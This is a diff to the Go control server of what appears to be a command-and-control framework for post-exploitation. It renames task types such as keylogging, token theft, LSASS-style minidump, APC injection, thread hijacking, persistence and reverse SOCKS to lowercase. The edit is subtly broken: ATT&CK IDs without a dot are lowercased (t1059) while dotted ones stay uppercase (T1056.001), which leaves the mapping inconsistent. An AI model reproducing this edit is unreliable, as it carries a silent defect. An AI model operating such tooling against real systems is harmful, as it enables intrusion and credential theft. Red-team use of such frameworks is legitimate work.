@@ -319,11 +319,11 @@ func (s *Server) apiAgentDetail(w http.ResponseWriter, r *http.Request) {
 			jsonErr(w, err.Error(), http.StatusBadRequest)
 			return
 		}
+		req.Type = strings.ToLower(strings.TrimSpace(req.Type))
 		if agent, err := s.db.GetAgent(agentID); err == nil {
 			if reason, blocked := unsupportedTaskReason(agent, req.Type); blocked {
 				jsonErr(w, fmt.Sprintf("%s is not supported by the %s agent on %s: %s",
-					strings.ToUpper(strings.TrimSpace(req.Type)),
-					agent.Language, normalizeAgentOS(agent.OS), reason), http.StatusConflict)
+					req.Type, agent.Language, normalizeAgentOS(agent.OS), reason), http.StatusConflict)
 				return
 			}
 		}
@@ -335,7 +335,7 @@ func (s *Server) apiAgentDetail(w http.ResponseWriter, r *http.Request) {
 		}
 		s.printf("[%s→%s] task #%d queued: %s %s\n", operator, shortID(agentID), tid, req.Type, req.Args)
 		// Update agent sleep in DB immediately so GUI reflects the new interval
-		if req.Type == "SLEEP" {
+		if req.Type == "sleep" {
 			var sa struct {
 				Sec    int `json:"sec"`
 				Jitter int `json:"jitter"`
@@ -397,7 +397,7 @@ func (s *Server) apiAgentDetail(w http.ResponseWriter, r *http.Request) {
 			jsonErr(w, "POST required", http.StatusMethodNotAllowed)
 			return
 		}
-		s.db.QueueTask(agentID, "KILL", "", nil, "")
+		s.db.QueueTask(agentID, "kill", "", nil, "")
 		s.db.KillAgent(agentID)
 		jsonOK(w, map[string]string{"status": "kill queued"})
 
@@ -467,7 +467,7 @@ func (s *Server) apiAgentDetail(w http.ResponseWriter, r *http.Request) {
 		}
 		packed := clrstompPack(req.Victim, req.Args, pipe, domain, asmBytes)
 		operator := operatorFromCert(r)
-		tid, err := s.db.QueueTask(agentID, "CLR_STOMP",
+		tid, err := s.db.QueueTask(agentID, "clr_stomp",
 			base64.StdEncoding.EncodeToString(packed), bofBytes, operator)
 		if err != nil {
 			jsonErr(w, err.Error(), http.StatusInternalServerError)
@@ -513,7 +513,7 @@ func (s *Server) apiAgentDetail(w http.ResponseWriter, r *http.Request) {
 			"method": req.Method,
 		})
 		operator := operatorFromCert(r)
-		tid, err := s.db.QueueTask(agentID, "DOTNET_EXEC", string(taskArgsJSON), nil, operator)
+		tid, err := s.db.QueueTask(agentID, "dotnet_exec", string(taskArgsJSON), nil, operator)
 		if err != nil {
 			jsonErr(w, err.Error(), http.StatusInternalServerError)
 			return
@@ -637,12 +637,12 @@ func (s *Server) apiAgentDetail(w http.ResponseWriter, r *http.Request) {
 			return
 		}
 
-		taskType := "INJECT_REMOTE"
+		taskType := "inject_remote"
 		switch req.Method {
 		case "apc":
-			taskType = "INJECT_APC"
+			taskType = "inject_apc"
 		case "hijack":
-			taskType = "THREAD_HIJACK"
+			taskType = "thread_hijack"
 		}
 
 		taskArgs := fmt.Sprintf(`{"pid":%d}`, req.PID)
@@ -2295,7 +2295,7 @@ func (s *Server) apiRSocks(w http.ResponseWriter, r *http.Request) {
 			return
 		}
 		op := operatorFromCert(r)
-		s.db.QueueTask(req.AgentID, "RSOCKS_START", strconv.Itoa(callbackPort), nil, op)
+		s.db.QueueTask(req.AgentID, "rsocks_start", strconv.Itoa(callbackPort), nil, op)
 		s.printf("[%s] rsocks: agent=%s socks=:%d callback=:%d\n",
 			op, shortID(req.AgentID), req.SocksPort, callbackPort)
 		resp := map[string]interface{}{
@@ -2321,7 +2321,7 @@ func (s *Server) apiRSocks(w http.ResponseWriter, r *http.Request) {
 			return
 		}
 		op := operatorFromCert(r)
-		s.db.QueueTask(req.AgentID, "RSOCKS_STOP", "", nil, op)
+		s.db.QueueTask(req.AgentID, "rsocks_stop", "", nil, op)
 		jsonOK(w, map[string]string{"status": "stopped"})
 
 	default:
@@ -2491,41 +2491,41 @@ func (s *Server) apiAttackLayer(w http.ResponseWriter, r *http.Request) {
 
 	// task-type → ATT&CK technique ID
 	techMap := map[string]string{
-		"SHELL":            "T1059",
-		"SYSINFO":          "T1082",
-		"PS":               "T1057",
-		"PORT_SCAN":        "T1046",
-		"SCREENSHOT":       "T1113",
-		"CLIP_GET":         "T1115",
-		"KEYLOG_START":     "T1056.001",
-		"KEYLOG_DUMP":      "T1056.001",
-		"KEYLOG_STOP":      "T1056.001",
-		"DOWNLOAD":         "T1041",
-		"UPLOAD":           "T1105",
-		"STAGE2":           "T1105",
-		"INJECT_REMOTE":    "T1055",
-		"INJECT_APC":       "T1055.004",
-		"FORK_RUN":         "T1055",
-		"TOKEN_STEAL":      "T1134.001",
-		"TOKEN_MAKE":       "T1134.003",
-		"TOKEN_WHOAMI":     "T1134",
-		"REV2SELF":         "T1134",
-		"MINIDUMP":         "T1003.001",
-		"PERSIST":          "T1547",
-		"PERSIST_RM":       "T1547",
-		"PERSIST_TASK":     "T1053.005",
-		"SOCKS_START":      "T1090",
-		"SOCKS5_START":     "T1090",
-		"RSOCKS_START":     "T1090.002",
-		"HTTP_PIVOT_START": "T1090",
-		"TCP_PIVOT_START":  "T1090",
-		"PORTFWD_ADD":      "T1572",
-		"WINRM_EXEC":       "T1021.006",
-		"WINRM_DEPLOY":     "T1021.006",
-		"PIPE_START":       "T1021.002",
-		"CLEANUP":          "T1070",
-		"ISHELL_OPEN":      "T1059",
-		"ISHELL_RUN":       "T1059",
+		"shell":            "t1059",
+		"sysinfo":          "t1082",
+		"ps":               "t1057",
+		"port_scan":        "t1046",
+		"screenshot":       "t1113",
+		"clip_get":         "t1115",
+		"keylog_start":     "T1056.001",
+		"keylog_dump":      "T1056.001",
+		"keylog_stop":      "T1056.001",
+		"download":         "t1041",
+		"upload":           "t1105",
+		"stage2":           "t1105",
+		"inject_remote":    "t1055",
+		"inject_apc":       "T1055.004",
+		"fork_run":         "t1055",
+		"token_steal":      "T1134.001",
+		"token_make":       "T1134.003",
+		"token_whoami":     "t1134",
+		"rev2self":         "t1134",
+		"minidump":         "T1003.001",
+		"persist":          "t1547",
+		"persist_rm":       "t1547",
+		"persist_task":     "T1053.005",
+		"socks_start":      "t1090",
+		"socks5_start":     "t1090",
+		"rsocks_start":     "T1090.002",
+		"http_pivot_start": "t1090",
+		"tcp_pivot_start":  "t1090",
+		"portfwd_add":      "t1572",
+		"winrm_exec":       "T1021.006",
+		"winrm_deploy":     "T1021.006",
+		"pipe_start":       "T1021.002",
+		"cleanup":          "t1070",
+		"ishell_open":      "t1059",
+		"ishell_run":       "t1059",
 	}
 
 	data, err := s.db.GetReportData()
@@ -3340,7 +3340,7 @@ func (s *Server) apiMesh(w http.ResponseWriter, r *http.Request) {
 			req.Proto = "http"
 		}
 		s.registerMeshPeer(req.AgentID, req.Addr, req.Proto)
-		BroadcastGUI("MESH_PEER_UP", req.AgentID, req.Addr)
+		BroadcastGUI("mesh_peer_up", req.AgentID, req.Addr)
 		jsonOK(w, map[string]string{"status": "registered"})
 
 	case r.Method == http.MethodDelete:
@@ -3350,7 +3350,7 @@ func (s *Server) apiMesh(w http.ResponseWriter, r *http.Request) {
 			return
 		}
 		s.unregisterMeshPeer(id)
-		BroadcastGUI("MESH_PEER_DOWN", id, "")
+		BroadcastGUI("mesh_peer_down", id, "")
 		jsonOK(w, map[string]string{"status": "removed"})
 
 	default:
